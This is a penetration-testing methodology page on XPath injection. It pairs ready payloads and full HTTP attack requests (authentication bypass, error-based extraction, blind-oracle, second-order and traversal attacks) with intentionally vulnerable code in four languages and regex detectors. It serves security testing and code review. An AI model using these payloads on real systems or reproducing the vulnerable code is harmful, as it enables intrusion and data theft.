# XPath Injection

## Check List

## Methodology

### Black Box

#### Bypass Authentication via XPath Injection

{% stepper %}
{% step %}
Log in to the target site and complete the authentication process on the site

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

UserName=testuser&Password=test
```
{% endstep %}

{% step %}
Then, using Burp Suite, intercept the authentication requests and verify that the application is using an XML document to store user information.
{% endstep %}

{% step %}
Fill in the username and password entries on the authentication page Submit the request and track the submitted request
{% endstep %}

{% step %}
Then, in the intercepted request, check whether the parameters sent in the request are in the form of an XPATH structure like

```sql
[UserName/text()='" & Request("UserName") & "' And Password/text()='" & Request("Password") & "']
```
{% endstep %}

{% step %}
Enter a valid value in the password field (`test`)
{% endstep %}

{% step %}
In the username field, inject the following malicious payload

```sql
test' or 1=1 or 'a'='a
```

The payload has been injected

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

UserName=test' or 1=1 or 'a'='a&Password=test
```
{% endstep %}

{% step %}
Submit the login request and Observe that the XPath query is modified as follows

```sql
[UserName/text()='test' or 1=1 or 'a'='a' And Password/text()='test']
```
{% endstep %}

{% step %}
If the injected condition 1=1 is true and the authentication is successful, the vulnerability is resolved
{% endstep %}
{% endstepper %}

***

#### XPath Injection via product API

{% stepper %}
{% step %}
Log into the target site and intercept the requests using burp suite
{% endstep %}

{% step %}
Then look for APIs for products that have database-like parameters, such as the getcolumns parameter

```http
GET /api/product.php?parent_callid=[VALUE]&callid=[VALUE]&getcolumns=
```
{% endstep %}

{% step %}
Send a normal request to confirm the endpoint responds successfully without any errors
{% endstep %}

{% step %}
Modify the `getcolumns` parameter by injecting the following payload to trigger an XPath error-based SQL injection

```sql
extractvalue(1,concat(0x7e,version()))
```
{% endstep %}

{% step %}
Send the following HTTP request

```http
GET /api/product.php?parent_callid=mobile&callid=123&getcolumns=extractvalue(1,concat(0x7e,version()))
```
{% endstep %}

{% step %}
Observe that the server returns an error message containing the database version in the XPath syntax error response
{% endstep %}

{% step %}
Modify the `getcolumns` parameter again using the following payload to extract the current database name

```sql
updatexml(1,concat(0x7e,database()),1)
```
{% endstep %}

{% step %}
Send the following HTTP request

```sql
GET /api/product.php?parent_callid=mobile&callid=123&getcolumns=updatexml(1,concat(0x7e,database()),1)
```
{% endstep %}

{% step %}
Observe that the server returns an XPath syntax error message disclosing the current database name
{% endstep %}
{% endstepper %}

***

### White Box

#### Data Exfiltration via Predicate Breakout in Dynamic Identity Governance Projections

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on Identity Governance and Administration (IGA) portals, specifically features allowing delegated administrators to create "Dynamic Access Groups" or "Automated Provisioning Rules"
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the enterprise Identity aggregation architecture. Massive organizations rarely rely on a single database for identities; they aggregate HR systems (Workday, SAP) and Active Directory domains into a centralized, XML-based Virtual Directory Service (VDS) to unify identity structures in memory
{% endstep %}

{% step %}
Investigate the "Dynamic Rule Translation" optimization. To avoid forcing department managers to learn complex LDAP or SQL syntaxes, the platform exposes a simplified JSON rules API (e.g., `{"Title": "Director", "Location": "US"}`)
{% endstep %}

{% step %}
Analyze the query compiler inside the IGA backend. The backend must translate this simplified JSON into a native XPath expression to execute against the XML-based Virtual Directory
{% endstep %}

{% step %}
Discover the multi-tenant isolation strategy: To physically prevent a department manager from querying identities outside their purview, the compiler hardcodes the manager's department into the XPath predicate _before_ appending the dynamically translated user rule
{% endstep %}

{% step %}
Locate the fatal boundary failure: Because standard XPath libraries fundamentally lack robust parameterized query APIs (unlike SQL prepared statements), the developer relies on raw string interpolation to construct the predicate: `//Employees/Employee[Department='{ManagerDept}' and ({TranslatedRule})]`
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes the surrounding brackets `[` and `]` act as an inescapable cryptographic jail, mathematically binding the manager's custom rule to the hardcoded `Department` condition
{% endstep %}

{% step %}
Formulate the Predicate Breakout attack. As a low-privilege manager, submit a custom rule payload containing a closing bracket `]` to prematurely terminate the isolation predicate, followed by the Union operator `|` to initiate a completely new, unrestricted query against the global document root
{% endstep %}

{% step %}
Inject a Blind XPath payload into the rule. Since the application does not display the raw output of the Virtual Directory nodes to the manager (it merely updates the internal group membership roster count), you must construct an asynchronous Boolean Oracle
{% endstep %}

{% step %}
Design the payload to guess the characters of a Highly Privileged user's hidden attributes (e.g., an API key, SSN, or Password Hash stored in the Virtual Directory but hidden from the UI): `1=0)] | //Employees/Employee[Role='DomainAdmin' and starts-with(SecretApiKey, 'A')] | //Employees/Employee[Department='None' and (1=1`
{% endstep %}

{% step %}
The backend compiles the string. The resulting XPath evaluates the isolated department rule (which is forced to false `1=0`), and unions it with your global query
{% endstep %}

{% step %}
If the Domain Admin's API key begins with 'A', the XPath query matches the Admin node. The IGA engine silently adds the Admin to your dynamic group. By observing the group's "Member Count" via the standard dashboard API, you gain a perfect boolean inference oracle, enabling byte-by-byte exfiltration of the entire corporate identity mesh

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:xpathQuery\s*=\s*\$".*//.*\[.*=.*and\s*\(\{.*\}|XPathExpression|XPath\.Select.*\+|Compile\s*\(.*xpath)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\.format\s*\(.*//.*\[.*='%s'.*and\s*\(.*%s|XPath\.evaluate\s*\(|XPathExpression|xpath\.evaluate\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:xpath\s*\(.*//.*\[.*and\s*\(\$|DOMXPath|evaluate\s*\(.*\$|query\s*\(.*//.*\{\\\$)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xpath\.select\s*\(`.*//.*\[.*\$\{|xpath\(|evaluate\s*\(`.*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
xpathQuery\s*=\s*\$".*//.*\[.*and\s*\(\{|XPath\.Select|Compile\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\.format\(.*//.*\[.*and\s*\(.*%s|XPath\.evaluate\(|xpath\.evaluate\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
query\(".*//.*and\s*\(\{\$|DOMXPath|evaluate\(.*\$
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xpath\.select\(`.*//.*\$\{|xpath\.select\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class DynamicGroupService 
{
    private readonly XmlDocument _virtualDirectory;

    public async Task<int> EvaluateGroupMembershipAsync(string managerDept, string userRule) 
    {
        // [1]
        // [2]
        // [3]
        var xpathQuery = $"//Employees/Employee[Department='{managerDept}' and ({userRule})]";
        
        // [4]
        var matchedNodes = _virtualDirectory.SelectNodes(xpathQuery);
        
        if (matchedNodes != null)
        {
            await _groupRepo.UpdateMemberCountAsync(matchedNodes.Count);
            return matchedNodes.Count;
        }
        
        return 0;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class DynamicGroupService {

    @Autowired
    private Document virtualDirectory;
    @Autowired
    private XPathFactory xPathFactory;

    public int evaluateGroupMembership(String managerDept, String userRule) throws Exception {
        // [1]
        // [2]
        // [3]
        String xpathQuery = String.format("//Employees/Employee[Department='%s' and (%s)]", managerDept, userRule);
        
        XPath xpath = xPathFactory.newXPath();
        
        // [4]
        NodeList matchedNodes = (NodeList) xpath.evaluate(xpathQuery, virtualDirectory, XPathConstants.NODESET);
        
        if (matchedNodes != null) {
            groupRepo.updateMemberCount(matchedNodes.getLength());
            return matchedNodes.getLength();
        }
        
        return 0;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DynamicGroupService 
{
    protected $virtualDirectory;

    public function evaluateGroupMembership(string $managerDept, string $userRule): int 
    {
        $xpath = new DOMXPath($this->virtualDirectory);
        
        // [1]
        // [2]
        // [3]
        $xpathQuery = "//Employees/Employee[Department='{$managerDept}' and ({$userRule})]";
        
        // [4]
        $matchedNodes = $xpath->query($xpathQuery);
        
        if ($matchedNodes !== false) {
            $this->groupRepo->updateMemberCount($matchedNodes->length);
            return $matchedNodes->length;
        }
        
        return 0;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class DynamicGroupService {
    static async evaluateGroupMembership(managerDept, userRule) {
        // [1]
        // [2]
        // [3]
        let xpathQuery = `//Employees/Employee[Department='${managerDept}' and (${userRule})]`;
        
        // [4]
        let matchedNodes = xpath.select(xpathQuery, virtualDirectory);
        
        if (matchedNodes && matchedNodes.length > 0) {
            await groupRepo.updateMemberCount(matchedNodes.length);
            return matchedNodes.length;
        }
        
        return 0;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture executes identity queries directly against a unified XML Virtual Directory in memory to satisfy high-throughput IAM governance rules, \[2] To enforce strict departmental data isolation, the developer prepends the manager's verified department into the query string, \[3] The developer blindly appends the translated user rule into the predicate block, assuming the surrounding parentheses and square brackets will contain the execution logic strictly to the specified department, \[4] The fatal boundary collapse. The XPath evaluator processes the concatenated string. Because the attacker injected `)] | //`, the evaluator prematurely terminates the `[Department='HR'...]` predicate and executes the subsequent global Union query across the entire XML tree. The engine returns the highly privileged nodes, leaking the boolean truth via the resulting `matchedNodes.Count`

```http
// 1. Attacker (Manager of 'Logistics') attempts to steal the Domain Admin's API key.
// 2. Attacker configures a Dynamic Group Rule containing the Blind XPath payload.
POST /api/v1/iga/dynamic-groups/evaluate HTTP/1.1
Host: iam.enterprise.tld
Authorization: Bearer <manager_token>
Content-Type: application/json

{
  "groupName": "Test Oracle Group",
  "ruleExpression": "1=0)] | //Employees/Employee[Role='DomainAdmin' and starts-with(SecretApiKey, 'A')] | //Employees/Employee[Department='None' and (1=1"
}

// 3. The Backend compiles the query:
// //Employees/Employee[Department='Logistics' and (1=0)] | //Employees/Employee[Role='DomainAdmin' and starts-with(SecretApiKey, 'A')] | //Employees/Employee[Department='None' and (1=1)]

// 4. The Backend responds with the group member count.
HTTP/1.1 200 OK
Content-Type: application/json

{"memberCount": 1} 

// The '1' indicates the DomainAdmin's API key starts with 'A'. 
// The attacker increments to the next character (e.g., 'AA', 'AB') and automates the extraction.
```
{% endstep %}

{% step %}
To support self-service identity governance without relying on heavy SQL abstractions, the enterprise architected an XML-based Virtual Directory queried via dynamic XPath expressions. To enforce data isolation, engineers manually constructed an authorization jail within the XPath predicate. They fundamentally misunderstood XPath structural evaluation, assuming brackets functioned as absolute confinement mechanisms. The attacker exploited this by injecting structural delimiters that successfully broke out of the predicate enclosure and initiated an unconstrained Union query. By leveraging the application's native behavior of returning the total match count, the attacker established a perfectly reliable Blind XPath Oracle, systematically exfiltrating highly classified cryptographic attributes from the global enterprise identity mesh
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via Second-Order XPath Injection in B2B Message Routing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on API Gateways handling complex B2B integration standards (e.g., Financial FIX, SWIFT, HL7, UBL Invoices)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Content-Based Routing" architecture within the Enterprise Service Bus (ESB). To dynamically route incoming XML messages to the correct departmental microservice without requiring a monolithic routing database, the ESB maintains a centralized, in-memory `routing-topology.xml` file
{% endstep %}

{% step %}
Observe the message processing lifecycle: The ingress gateway strictly parses the incoming partner XML document using hardened XML parsers (explicitly disabling XXE, DTDs, and enforcing XSD schema validation)
{% endstep %}

{% step %}
Investigate the extraction layer. The gateway uses a predefined, safe XPath expression to extract a specific routing variable, such as the `SupplierName` or `SenderID`, from the incoming payload
{% endstep %}

{% step %}
Analyze the secondary routing phase. The ESB takes this extracted `SenderID` and interpolates it into a _second_ XPath query. This second query is executed against the internal `routing-topology.xml` to locate the destination Kafka topic or internal HTTP endpoint (e.g., `/Topology/Route[@name='{SenderID}']/DestinationQueue/text()`)
{% endstep %}

{% step %}
Discover the latent trust boundary failure: The developers assumed that defending the primary XML parser against XXE and SSRF attacks was sufficient. They failed to realize that XML XSD schemas validate structural integrity, not character content. The extracted `SenderID` string remains inherently untrusted and capable of breaking downstream string-concatenated queries
{% endstep %}

{% step %}
Construct a structurally flawless B2B XML payload matching the required XSD schema
{% endstep %}

{% step %}
Within the `SenderID` node, inject an XPath evasion payload designed to break out of the routing predicate and select a highly privileged internal routing destination. Target a queue that inherently trusts incoming messages to execute state changes (e.g., an administrative audit queue or a master database ingestion topic)
{% endstep %}

{% step %}
Example Payload: `DummyVendor']/DestinationQueue/text() | //Route[@type='Admin_Execution_Queue']/DestinationQueue/text() | //Route[@name='`
{% endstep %}

{% step %}
Submit the payload to the ingestion endpoint. The Gateway securely parses the XML and extracts your poisoned string
{% endstep %}

{% step %}
The Gateway injects the string into the internal topology query. The query executes the Union operator `|`, abandons the intended supplier route, and evaluates the internal destination URI of the administrative execution queue.
{% endstep %}

{% step %}
The ESB faithfully forwards your external attacker-controlled XML payload to the highly privileged internal queue, completely bypassing perimeter access controls and executing unauthorized commands deep within the internal mesh.=

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:topologyXml\.SelectSingleNode\s*\(\s*\$".*//Route\[@name='.*'\].*|XPathNavigator|SelectNodes\s*\(\s*\$".*//.*\[.*=.*\{.*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:xpath\.evaluate\s*\(\s*"//Route\[@name='.*'.*|XPathExpression|XPath\.compile\s*\(.*//.*\[.*\+.*\])
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$xpath->query\s*\(\s*".*//Route\[@name='\{\$.*|DOMXPath|evaluate\s*\(\s*".*//.*\[.*\$)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xpath\.select\s*\(`.*//Route\[@name='\$\{.*\}'\]|xpath\.useNamespaces|xpath\.evaluate\s*\(`.*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
topologyXml\.SelectSingleNode\(\\\$".*//Route\[@name='.*'\]/Destination|SelectNodes\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
xpath\.evaluate\(\"//Route\[@name='.*'\]/DestinationQueue/text\(\)\"|XPath\.compile\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$xpath->query\(\"//Route\[@name='\{\$.*'\]/Destination|DOMXPath
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xpath\.select\(`//Route\[@name='\$\{.*\}'\]/Destination|xpath\.evaluate\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class EsbRoutingService 
{
    private readonly XmlDocument _topologyXml;
    private readonly IKafkaProducer _kafka;

    public async Task RouteMessageAsync(XmlDocument incomingMessage) 
    {
        // [1]
        var senderNode = incomingMessage.SelectSingleNode("//Invoice/Header/SupplierName/text()");
        if (senderNode == null) throw new ArgumentException("Invalid Schema");

        var senderId = senderNode.Value;

        // [2]
        // [3]
        // [4]
        var routingQuery = $"//Route[@name='{senderId}']/DestinationQueue/text()";
        var destinationNode = _topologyXml.SelectSingleNode(routingQuery);

        if (destinationNode != null) 
        {
            await _kafka.PublishAsync(destinationNode.Value, incomingMessage.OuterXml);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class EsbRoutingService {

    @Autowired
    private Document topologyXml;
    @Autowired
    private KafkaProducer kafka;
    @Autowired
    private XPathFactory xPathFactory;

    public void routeMessage(Document incomingMessage) throws Exception {
        XPath xpath = xPathFactory.newXPath();
        
        // [1]
        String senderId = xpath.evaluate("//Invoice/Header/SupplierName/text()", incomingMessage);
        if (senderId == null || senderId.isEmpty()) throw new IllegalArgumentException("Invalid Schema");

        // [2]
        // [3]
        // [4]
        String routingQuery = "//Route[@name='" + senderId + "']/DestinationQueue/text()";
        String destinationQueue = xpath.evaluate(routingQuery, topologyXml);

        if (destinationQueue != null && !destinationQueue.isEmpty()) {
            kafka.publish(destinationQueue, xmlToString(incomingMessage));
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class EsbRoutingService 
{
    protected $topologyXml;
    protected $kafka;

    public function routeMessage(\DOMDocument $incomingMessage): void 
    {
        $xpathIn = new DOMXPath($incomingMessage);
        
        // [1]
        $senderNodes = $xpathIn->query("//Invoice/Header/SupplierName/text()");
        if ($senderNodes->length === 0) throw new InvalidArgumentException("Invalid Schema");

        $senderId = $senderNodes->item(0)->nodeValue;

        // [2]
        // [3]
        // [4]
        $routingQuery = "//Route[@name='{$senderId}']/DestinationQueue/text()";
        
        $xpathTop = new DOMXPath($this->topologyXml);
        $destinationNodes = $xpathTop->query($routingQuery);

        if ($destinationNodes !== false && $destinationNodes->length > 0) {
            $this->kafka->publish($destinationNodes->item(0)->nodeValue, $incomingMessage->saveXML());
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class EsbRoutingService {
    static async routeMessage(incomingMessage) {
        // [1]
        let senderNodes = xpath.select("//Invoice/Header/SupplierName/text()", incomingMessage);
        if (!senderNodes || senderNodes.length === 0) throw new Error("Invalid Schema");

        let senderId = senderNodes[0].nodeValue;

        // [2]
        // [3]
        // [4]
        let routingQuery = `//Route[@name='${senderId}']/DestinationQueue/text()`;
        let destinationNodes = xpath.select(routingQuery, topologyXml);

        if (destinationNodes && destinationNodes.length > 0) {
            await kafka.publish(destinationNodes[0].nodeValue, new XMLSerializer().serializeToString(incomingMessage));
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Gateway successfully ingests the external payload, confirms it passes all rigorous XSD structural schema checks and XXE defense filters, and extracts the target routing variable, \[2] To eliminate the overhead of maintaining database tables for microservice routing configurations, the ESB utilizes a centralized, static XML file (`topology.xml`) loaded securely into memory, \[3] The architecture relies entirely on the premise that data extracted from a structurally sound, XSD-validated XML document is inherently safe for internal re-use, \[4] The fatal Second-Order execution sink. The ESB concatenates the unescaped `senderId` directly into the internal topology query. By appending the Union operator `|` within the `SupplierName` field, the attacker escapes the intended supplier's routing block and instructs the XPath engine to return the destination string for highly classified internal queues. The Gateway blindly forwards the attacker's payload to the core backend engine

```http
// 1. Attacker crafts a standard UBL Invoice XML document.
// 2. Attacker injects the XPath evasion payload into the strictly typed SupplierName field.
POST /api/v1/b2b/invoices/ingest HTTP/1.1
Host: esb.enterprise.tld
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<Invoice>
    <Header>
        <SupplierName>Dummy'] /DestinationQueue/text() | //Route[@type='Core_Banking_Batch_Queue']/DestinationQueue/text() | //Route[@name='</SupplierName>
    </Header>
    <Body>
        <Transaction action="ExecuteMassRefund" targetAccount="Attacker" amount="500000" />
    </Body>
</Invoice>

// 3. The API Gateway receives the document, parses it safely, and evaluates the internal routing string:
// //Route[@name='Dummy'] /DestinationQueue/text() | //Route[@type='Core_Banking_Batch_Queue']/DestinationQueue/text() | //Route[@name='']/DestinationQueue/text()

// 4. The query returns the Kafka topic mapped to the Core Banking queue.
// 5. The ESB publishes the malicious XML transaction directly to the core banking processor.
HTTP/1.1 202 Accepted
{"status": "Message Queued for Processing"}
```
{% endstep %}

{% step %}
To support complex B2B integrations, the Enterprise Service Bus implemented dynamic content-based routing utilizing a centralized XML topology map. Engineers fortified the perimeter by aggressively hardening the XML ingress parser against XXE and SSRF, relying on strict XSD validation. However, they failed to recognize that XSD schema validation does not inherently restrict alphanumeric characters capable of breaking XPath syntax. When the attacker submitted a valid XML payload containing XPath operators in the metadata fields, the gateway safely extracted the string. The Second-Order vulnerability executed when the internal ESB interpolated that string into the topology lookup query. The payload commanded the XPath engine to union the result with the internal Core Banking topic. The ESB faithfully extracted the classified destination and beamed the unauthenticated external payload directly into the protected internal execution zone, compromising the supply chain
{% endstep %}
{% endstepper %}

***

#### Cross-Tenant Data Exfiltration via Relative Path Traversal in Dynamic XML Reporting Projections

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on data extraction and reporting architectures where users can dynamically configure the structure of their exported data
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Backend-For-Frontend (BFF) proxy architecture. Enterprise platforms frequently interface with legacy Mainframes or SOAP-based ERPs that natively output massive, deeply nested XML documents containing bulk data batches
{% endstep %}

{% step %}
Investigate the "Custom Report Projection" optimization. To avoid sending megabytes of unnecessary XML data to the frontend SPA, the BFF implements a dynamic projection API. The frontend requests specific fields by sending an array of property paths (e.g., `["Profile/Email", "Financials/Balance"]`
{% endstep %}

{% step %}
Analyze the extraction loop in the decompiled BFF. To rapidly extract the requested fields without building complex DTO mapping classes or XSLT transformations, the developer utilizes the client-provided paths directly as dynamic XPath queries executed against the XML DOM
{% endstep %}

{% step %}
Observe the multi-tenant security boundary constraint. The developer attempts to lock the query scope by hardcoding the user's authenticated ID into the absolute base path: `$"/BatchResponse/Tenant[@id='{CurrentTenant}']/User[@id='{CurrentUser}']/{requestedPath}"`
{% endstep %}

{% step %}
Understand the hidden architectural assumption: The developer assumes that because the base path is cryptographically bound to the user's active session token, the execution context is hermetically sealed within their own XML node. They fundamentally misunderstand the hierarchical traversal capabilities inherent to the XPath standard
{% endstep %}

{% step %}
Discover the data leakage vector. The legacy backend returns the batch XML containing _multiple_ tenants or highly sensitive internal system metadata nodes (e.g., `//SystemTelemetry/InternalDatabaseCredentials`) appended to the root document, operating on the assumption that the BFF will safely filter them out before delivering data to the end user
{% endstep %}

{% step %}
Construct a malicious JSON reporting request. Inject a relative XPath traversal payload using the parent axis `../` or the global descendant axis `//` to break out of the authenticated base path
{% endstep %}

{% step %}
Example Payload: `../../Tenant[@id='TargetOrg']/User[@id='TargetAdmin']/PasswordResetToken` or `//SystemTelemetry/InternalDatabaseCredentials`
{% endstep %}

{% step %}
Send the request to the BFF reporting endpoint
{% endstep %}

{% step %}
The BFF securely interpolates your payload into the base string. The resulting query becomes: `/BatchResponse/Tenant[@id='OrgA']/User[@id='User1']/../../Tenant[@id='TargetOrg']...`.
{% endstep %}

{% step %}
The XPath engine executes the query, flawlessly traversing up the XML DOM tree, escaping the intended user node boundary, and navigating downward into the target victim's organizational data block
{% endstep %}

{% step %}
The BFF aggregates the exfiltrated node values into the custom JSON report and delivers the cross-tenant data directly to your browser

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:var\s+query\s*=\s*\$".*//BatchResponse/Tenant\[@id='.*'\]/User\[@id='.*'\].*\{.*\}|SelectSingleNode\s*\(\s*\$".*Tenant.*User.*\{.*\}|SelectNodes\s*\(\s*\$".*//.*\[.*=.*\{)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\.format\s*\(\s*"//BatchResponse/Tenant\[@id='%s'\]/User\[@id='%s'\]/%s"|XPath\.evaluate\s*\(.*//BatchResponse/Tenant.*User.*|XPath\.compile\s*\(.*\+.*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$xpath->query\s*\(\s*".*//BatchResponse/Tenant\[@id='\{\$.*|DOMXPath|evaluate\s*\(.*\$tenantId|\$userId)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xpath\.select\s*\(`.*//BatchResponse/Tenant\[@id='\$\{tenantId\}'\]/User\[@id='\$\{userId\}'\].*\$\{path\}`|xpath\.evaluate\s*\(`.*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
var\s+query\s*=\s*\\\$".*//BatchResponse/Tenant\[@id='.*'\]/User\[@id='.*'\].*\{requestedPath\}|SelectSingleNode\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\.format\(\"//BatchResponse/Tenant\[@id='%s'\]/User\[@id='%s'\]/%s\"|XPath\.evaluate\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$xpath->query\(\"//BatchResponse/Tenant\[@id='\{\$tenantId\}'\]/User\[@id='\{\$userId\}'\]
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xpath\.select\(`//BatchResponse/Tenant\[@id='\$\{tenantId\}'\]/User\[@id='\$\{userId\}'\]/\$\{path\}`
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class CustomReportingService 
{
    private readonly IMainframeClient _mainframe;

    public async Task<Dictionary<string, string>> GenerateCustomReportAsync(string tenantId, string userId, List<string> requestedPaths) 
    {
        // [1]
        var batchXmlDoc = await _mainframe.GetNightlyBatchXmlAsync();
        var reportData = new Dictionary<string, string>();

        // [2]
        foreach (var path in requestedPaths) 
        {
            // [3]
            // [4]
            var query = $"/BatchResponse/Tenant[@id='{tenantId}']/User[@id='{userId}']/{path}";
            
            var node = batchXmlDoc.SelectSingleNode(query);
            if (node != null) 
            {
                reportData[path] = node.InnerText;
            }
        }

        return reportData;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class CustomReportingService {

    @Autowired
    private MainframeClient mainframe;
    @Autowired
    private XPathFactory xPathFactory;

    public Map<String, String> generateCustomReport(String tenantId, String userId, List<String> requestedPaths) throws Exception {
        // [1]
        Document batchXmlDoc = mainframe.getNightlyBatchXml();
        Map<String, String> reportData = new HashMap<>();
        
        XPath xpath = xPathFactory.newXPath();

        // [2]
        for (String path : requestedPaths) {
            // [3]
            // [4]
            String query = String.format("/BatchResponse/Tenant[@id='%s']/User[@id='%s']/%s", tenantId, userId, path);
            
            String result = xpath.evaluate(query, batchXmlDoc);
            if (result != null && !result.isEmpty()) {
                reportData.put(path, result);
            }
        }

        return reportData;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class CustomReportingService 
{
    protected $mainframe;

    public function generateCustomReport(string $tenantId, string $userId, array $requestedPaths): array 
    {
        // [1]
        $batchXmlDoc = $this->mainframe->getNightlyBatchXml();
        $xpathExec = new DOMXPath($batchXmlDoc);
        
        $reportData = [];

        // [2]
        foreach ($requestedPaths as $path) 
        {
            // [3]
            // [4]
            $query = "/BatchResponse/Tenant[@id='{$tenantId}']/User[@id='{$userId}']/{$path}";
            
            $nodes = $xpathExec->query($query);
            if ($nodes !== false && $nodes->length > 0) 
            {
                $reportData[$path] = $nodes->item(0)->nodeValue;
            }
        }

        return $reportData;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class CustomReportingService {
    static async generateCustomReport(tenantId, userId, requestedPaths) {
        // [1]
        let batchXmlDoc = await mainframe.getNightlyBatchXml();
        let reportData = {};

        // [2]
        for (let path of requestedPaths) {
            // [3]
            // [4]
            let query = `/BatchResponse/Tenant[@id='${tenantId}']/User[@id='${userId}']/${path}`;
            
            let nodes = xpath.select(query, batchXmlDoc);
            if (nodes && nodes.length > 0) {
                reportData[path] = nodes[0].nodeValue;
            }
        }

        return reportData;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Backend-For-Frontend fetches a massive, deeply nested XML batch document generated by the legacy Mainframe. To minimize internal API calls, the Mainframe returns multiple tenants and system telemetry elements in a single shared payload, \[2] The backend iterates over the array of specific fields requested by the frontend SPA, enabling highly dynamic and customizable PDF or JSON reports, \[3] The architecture relies heavily on string interpolation to lock the execution context. By explicitly injecting the authenticated `tenantId` and `userId` directly into the base path, the developer assumes the scope is hermetically sealed to the user's specific XML block, \[4] The fatal boundary violation. The developer treats the XPath query simply as a directory path, failing to understand that XPath inherently supports parent-axis traversal (e.g., `../`). When the attacker supplies the traversal operator, the XPath evaluator successfully navigates up the Document Object Model, escaping the user's isolation jail and resolving data from completely unrelated tenants or internal metadata stanzas

```http
// 1. Attacker interacts with the dynamic report generation endpoint.
// 2. Attacker modifies the JSON payload, injecting an XPath relative traversal string into the requested fields array.
POST /api/v1/reports/custom HTTP/1.1
Host: bff.enterprise.tld
Authorization: Bearer <tenant_a_user_token>
Content-Type: application/json

{
  "reportTitle": "My Analytics",
  "fields": [
    "Profile/FirstName",
    "../../Tenant[@id='Tenant_B']/User[@id='Admin_User']/PasswordResetToken",
    "../../../../SystemTelemetry/InternalDatabaseConnectionString"
  ]
}

// 3. The BFF string-concatenates the payload:
// /BatchResponse/Tenant[@id='Tenant_A']/User[@id='Attacker']/../../Tenant[@id='Tenant_B']/User[@id='Admin_User']/PasswordResetToken

// 4. The XPath engine traverses up two levels (escaping the User and Tenant nodes), descends into Tenant_B, and extracts the admin's secret token.
// 5. The BFF packages the exfiltrated data into the legitimate HTTP response and returns it.
HTTP/1.1 200 OK
Content-Type: application/json

{
  "Profile/FirstName": "Attacker",
  "../../Tenant[@id='Tenant_B']/User[@id='Admin_User']/PasswordResetToken": "8819-ABC-XYZ-TOKEN",
  "../../../../SystemTelemetry/InternalDatabaseConnectionString": "Server=tcp:internal-db.corp;Database=master;User ID=sa;Password=SuperSecretPassword123;"
}
```
{% endstep %}

{% step %}
To bridge the gap between heavy legacy Mainframe XML batch payloads and responsive modern SPAs, the BFF implemented a dynamic projection API. By explicitly binding the root of the XPath query to the user's cryptographically authenticated session claims, developers falsely assumed they had successfully sandboxed the execution scope. They fundamentally overlooked the recursive and hierarchical capabilities of the XPath standard. The attacker exploited this assumption by injecting relative traversal operators (`../`) into the request array. When the backend evaluator executed the compiled string, the execution engine perfectly honored the traversal directives, navigating out of the authenticated user's node and extracting highly classified system metadata and cross-tenant secrets from the shared XML document, establishing a devastating read-only compromise of the entire platform
